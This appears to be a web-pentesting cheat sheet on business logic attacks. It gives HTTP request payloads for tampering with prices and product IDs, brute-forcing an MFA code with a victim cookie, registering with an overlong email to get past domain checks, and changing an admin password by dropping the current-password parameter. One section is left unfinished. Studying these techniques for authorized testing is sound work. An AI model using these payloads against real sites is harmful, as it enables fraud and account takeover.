---
title: Business Logic Attack
desc: Business Logic is the part of the program that encodes the real-world business rules that determine how data can be created, stored, and changed. 
tags: [Burp, Business, Logic, Web]
alts: []
render_with_liquid: false
---

## Change POST Params to Unexpected Values

```sh
productId=-1
productId=a
productId=1&price=-1000
```

<br />

## Exploit Broken Two-Factor

1. **Brute force a MFA Code**

    ```html
    POST /login HTTP/1.1
    Cookie: verify=victim
    ...

    <!-- Brute force digits code -->
    mfa-code=1111
    ```

<br />

## Loop Back with 2,147,483,647

Coming soon.

<br />

## Register with Too Long-Length Email Address

```html
POST /register HTTP/1.1
...

username=attacker&password=pass1&email=aaaaaaaaaaaaa...aa@vulnerable.com.attacker.com
```

<br />

## Remove the Specific POST Params

```html
POST /change-password HTTP/1.1
...

<!-- Remove 'current-password' parameter -->
username=admin&new-password-1=newpass&new-password-2=newpass
```